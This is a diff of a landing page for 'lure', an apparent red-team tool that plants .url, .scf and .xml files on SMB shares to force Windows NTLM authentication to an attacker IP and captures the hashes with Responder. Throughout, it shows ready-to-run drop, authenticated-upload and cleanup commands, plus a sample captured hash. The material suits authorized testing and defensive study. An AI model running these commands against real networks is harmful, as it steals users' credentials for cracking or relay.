@@ -134,12 +134,12 @@
                     <span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span>
                     <span class="terminal-label">lure</span>
                 </div>
-                <div class="terminal-body"><pre><span class="t-g">$</span> sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 -a public -A
-<span class="t-y">[*] Making @lure.url</span>
-<span class="t-y">[*] Making @lure.scf</span>
-<span class="t-y">[*] Making @lure.xml</span>
-<span class="t-g">[+] Dropped onto //10.10.10.5/public</span>
-<span class="t-b">[*] Responder listening on tun0</span>
+                <div class="terminal-body"><pre><span class="t-g">$</span> sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 -s public
+<span class="t-g">[+] Wrote @lure.url</span>
+<span class="t-g">[+] Wrote @lure.scf</span>
+<span class="t-g">[+] Wrote @lure.xml</span>
+<span class="t-b">[*] Uploading 3 payload(s) at //10.10.10.5/public</span>
+<span class="t-b">[*] Starting Responder on tun0</span>
 <span class="t-l">[SMB] NTLMv2-SSP Hash : CORP\jdoe::CORP:…</span></pre></div>
             </div>
         </div>
@@ -167,8 +167,8 @@
             <div class="bento">
                 <div class="bento-card bento-hero animate" style="transition-delay:0.10s">
                     <h3>Drop and Listen</h3>
-                    <p>One command generates the payload, uses <code>smbclient</code> to upload it (anonymous, authenticated, or into a nested subdirectory), then hands off to Responder on your chosen interface to catch the inbound authentication.</p>
-                    <div class="mini-terminal"><span class="t-g">$</span> sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 -a public -u<br><span class="t-y">[*] Making @lure.url</span><br><span class="t-g">[+] Dropped. Starting Responder…</span><br><span class="t-b">[*] Listening for NTLMv2 on tun0</span></div>
+                    <p><code>lure drop</code> generates the payloads, uses <code>smbclient</code> to upload them (anonymous, authenticated, or into a nested subdirectory), then hands off to Responder on your chosen interface. Add <code>--no-listen</code> to drop only, or use <code>lure listen -i IFACE</code> separately.</p>
+                    <div class="mini-terminal"><span class="t-g">$</span> sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 -s public -p scf<br><span class="t-g">[+] Wrote @lure.scf</span><br><span class="t-b">[*] Uploading 1 payload(s) at //10.10.10.5/public</span><br><span class="t-b">[*] Starting Responder on tun0</span></div>
                 </div>
                 <div class="bento-card bento-stat animate" style="transition-delay:0.18s">
                     <div class="big">3</div>
@@ -192,12 +192,12 @@
                 </div>
                 <div class="bento-card bento-hero animate" style="transition-delay:0.58s">
                     <h3 style="color:var(--red)">Subdirectory Targeting</h3>
-                    <p>When the share root is read-only but a subdirectory is writable, <code>-o &lt;path&gt;</code> uploads the payload directly into the nested location without requiring a separate mount or CWD change.</p>
-                    <div class="mini-terminal"><span class="t-g">$</span> sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 \<br>&nbsp;&nbsp;&nbsp;&nbsp;-a shares -o HR/public -A<br><span class="t-g">[+] Dropped into //10.10.10.5/shares/HR/public</span></div>
+                    <p>When the share root is read-only but a subdirectory is writable, <code>-d &lt;path&gt;</code> uploads the payload directly into the nested location without requiring a separate mount or CWD change.</p>
+                    <div class="mini-terminal"><span class="t-g">$</span> sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 \<br>&nbsp;&nbsp;&nbsp;&nbsp;-s shares -d HR/public<br><span class="t-b">[*] Uploading 3 payload(s) at //10.10.10.5/shares/HR/public</span></div>
                 </div>
                 <div class="bento-card animate" style="transition-delay:0.66s">
-                    <h3 style="color:var(--yellow)">Authenticated Upload</h3>
-                    <p>Pass <code>-U user -P pass -d DOMAIN</code> to drop payloads onto shares that refuse anonymous access. Uses <code>smbclient</code>'s standard <code>DOMAIN/USER%PASS</code> auth.</p>
+                    <h3 style="color:var(--yellow)">Flexible Authentication</h3>
+                    <p><code>-u</code> accepts <code>user</code>, <code>DOMAIN/user</code>, <code>DOMAIN\user</code>, or <code>user@DOMAIN.LOCAL</code>. Passwords resolve from <code>--pass</code>, <code>$LURE_PASSWORD</code>, or <code>--ask-pass</code>.</p>
                 </div>
             </div>
         </div>
@@ -212,18 +212,20 @@
                 <div class="pill animate"><span class="dot dot-g"></span>.url Payload</div>
                 <div class="pill animate"><span class="dot dot-g"></span>.scf Payload</div>
                 <div class="pill animate"><span class="dot dot-g"></span>.xml Payload</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Drop All At Once</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Multi-Payload Session</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Subcommand CLI</div>
                 <div class="pill animate"><span class="dot dot-g"></span>Anonymous Upload</div>
                 <div class="pill animate"><span class="dot dot-g"></span>Authenticated Upload</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Domain Auth</div>
                 <div class="pill animate"><span class="dot dot-g"></span>Nested Path</div>
                 <div class="pill animate"><span class="dot dot-g"></span>UNC Coercion</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Icon Trigger</div>
                 <div class="pill animate"><span class="dot dot-g"></span>Responder Handoff</div>
                 <div class="pill animate"><span class="dot dot-g"></span>NTLMv2 Capture</div>
-                <div class="pill animate"><span class="dot dot-g"></span>smbclient Wrapper</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Cleanup Mode</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Listen Mode</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Share Enumeration</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Dry-Run Mode</div>
                 <div class="pill animate"><span class="dot dot-g"></span>Catppuccin Mocha</div>
-                <div class="pill animate"><span class="dot dot-g"></span>24-bit ANSI</div>
+                <div class="pill animate"><span class="dot dot-g"></span>NO_COLOR Honored</div>
                 <div class="pill animate"><span class="dot dot-g"></span>pipx Installable</div>
                 <div class="pill animate"><span class="dot dot-g"></span>Python 3.8+</div>
                 <div class="pill animate"><span class="dot dot-y"></span>Windows (WSL)</div>
@@ -240,10 +242,10 @@
             <h2 class="section-title animate" style="transition-delay:.08s">Bait, drop, coerce, capture</h2>
             <p class="section-desc animate" style="transition-delay:.16s">Lure chains four stages behind a single command. Every stage is a thin wrapper around tools already on your Kali box.</p>
             <div class="arch-grid">
-                <div class="arch-card animate" style="transition-delay:0.1s"><div class="arch-num">1</div><h3>Payload Generator</h3><p>Writes a <code>.url</code>, <code>.scf</code>, or <code>.xml</code> template with your <code>LHOST</code> embedded in the UNC path. The <code>@</code> filename prefix sorts the file to the top of directory listings.</p></div>
-                <div class="arch-card animate" style="transition-delay:0.2s"><div class="arch-num">2</div><h3>SMB Uploader</h3><p>Wraps <code>smbclient</code> with three upload modes — anonymous, authenticated (<code>DOMAIN/USER%PASS</code>), or nested (<code>cd &lt;subdir&gt; ; put</code>). Single invocation, no interactive shell.</p></div>
+                <div class="arch-card animate" style="transition-delay:0.1s"><div class="arch-num">1</div><h3>Payload Generator</h3><p>Writes a <code>.url</code>, <code>.scf</code>, or <code>.xml</code> template with your callback IP embedded in the UNC path. The <code>@</code> filename prefix sorts the file to the top of directory listings; <code>--name</code> overrides for telemetry-aware engagements.</p></div>
+                <div class="arch-card animate" style="transition-delay:0.2s"><div class="arch-num">2</div><h3>SMB Uploader</h3><p>Wraps <code>smbclient</code> with anonymous, authenticated, and nested upload modes via a single <code>subprocess.run</code> argv list — no shell, no injection surface. Multiple payloads land in one session.</p></div>
                 <div class="arch-card animate" style="transition-delay:0.3s"><div class="arch-num">3</div><h3>Coercion Trigger</h3><p>When a user browses the share, Explorer resolves the UNC icon reference or opens the Word document. Windows auto-authenticates to the attacker IP using the user's NTLM credentials.</p></div>
-                <div class="arch-card animate" style="transition-delay:0.4s"><div class="arch-num">4</div><h3>Responder Handoff</h3><p>Lure shells out to <code>sudo responder -I &lt;iface&gt; -wv</code> on the interface you provide. Inbound NTLMv2 hashes land straight into Responder's log for offline cracking or relay.</p></div>
+                <div class="arch-card animate" style="transition-delay:0.4s"><div class="arch-num">4</div><h3>Responder Handoff</h3><p>Lure shells out to <code>sudo responder -I &lt;iface&gt; -wv</code> on the interface you provide. Skip with <code>--no-listen</code> or invoke <code>lure listen -i IFACE</code> separately. Inbound NTLMv2 hashes land in Responder's log for offline cracking or relay.</p></div>
             </div>
         </div>
     </section>
@@ -270,19 +272,19 @@
                 </div>
                 <div class="terminal animate" style="transition-delay:.25s">
                     <div class="terminal-bar"><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-label">usage.sh</span></div>
-                    <div class="terminal-body"><pre><span class="t-m"># Drop a .url on an open share</span>
-<span class="t-g">$</span> sudo lure -r RHOST -l LHOST -i IFACE -a SHARE -u
+                    <div class="terminal-body"><pre><span class="t-m"># Drop a .scf on an open share</span>
+<span class="t-g">$</span> sudo lure drop -t TARGET -c CALLBACK -i IFACE -s SHARE -p scf
 
 <span class="t-m"># Authenticated upload to a domain share</span>
-<span class="t-g">$</span> sudo lure -r RHOST -l LHOST -i IFACE -a SHARE \
-    -d DOMAIN -U USER -P PASS -u
+<span class="t-g">$</span> sudo lure drop -t TARGET -c CALLBACK -i IFACE -s SHARE \
+    -u DOMAIN/USER --ask-pass
 
-<span class="t-m"># Drop all three payloads at once</span>
-<span class="t-g">$</span> sudo lure -r RHOST -l LHOST -i IFACE -a SHARE -A
+<span class="t-m"># Drop all three (default) into a nested subdirectory</span>
+<span class="t-g">$</span> sudo lure drop -t TARGET -c CALLBACK -i IFACE -s SHARE \
+    -d path/to/dir
 
-<span class="t-m"># Target a nested subdirectory</span>
-<span class="t-g">$</span> sudo lure -r RHOST -l LHOST -i IFACE -a SHARE \
-    -o path/to/dir -A</pre></div>
+<span class="t-m"># Clean up after the engagement</span>
+<span class="t-g">$</span> sudo lure clean -t TARGET -s SHARE</pre></div>
                 </div>
             </div>
         </div>
